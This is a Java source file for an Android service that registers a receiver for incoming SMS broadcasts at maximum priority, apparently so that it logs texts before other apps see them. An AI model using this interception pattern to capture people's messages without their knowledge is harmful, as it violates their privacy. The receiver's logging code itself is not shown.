package adat.service;

import adat.utils.Common;
import android.app.Service;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.IBinder;
import android.util.Log;
import adat.receiver.SMSLogReceiver;

public class SMSLogService extends Service {

	SMSLogReceiver logSMSReceiver = null;

	@Override
	public void onCreate() {
		logSMSReceiver = new SMSLogReceiver();
		IntentFilter intentFilter = new IntentFilter(
				"android.provider.Telephony.SMS_RECEIVED");
		intentFilter.setPriority(2147483647);
		logSMSReceiver = new SMSLogReceiver();
		registerReceiver(logSMSReceiver, intentFilter);
		System.out.println("LogSMSSer onCreate");
		super.onCreate();
	}

	@Override
	public IBinder onBind(Intent intent) {
		return null;
	}

	@Override
	public void onDestroy() {
		super.onDestroy();
		unregisterReceiver(logSMSReceiver);
		if (Common.IS_DEBUG) {
			Log.d("LogSMSServ", "onDestroy");
		}

	}

	@Override
	public void onStart(Intent intent, int startId) {
		super.onStart(intent, startId);
		if (Common.IS_DEBUG) {
			System.out.println("LogSMSServ onStart");
		}

	}

}